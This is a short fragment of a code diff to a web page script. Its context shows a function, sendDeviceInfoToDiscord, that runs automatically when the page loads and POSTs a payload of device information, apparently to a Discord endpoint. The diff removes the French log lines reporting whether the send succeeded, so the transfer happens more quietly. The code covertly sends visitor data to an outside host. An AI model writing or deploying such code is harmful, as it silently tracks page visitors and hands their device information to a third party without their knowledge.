@@ -73,12 +73,6 @@
                 },
                 body: JSON.stringify(payload)
             });
-
-            if (discordResponse.ok) {
-                console.log('Données envoyées à Discord avec succès');
-            } else {
-                console.error('Erreur lors de l\'envoi des données à Discord');
-            }
         };
         document.addEventListener('DOMContentLoaded', sendDeviceInfoToDiscord);
     </script>
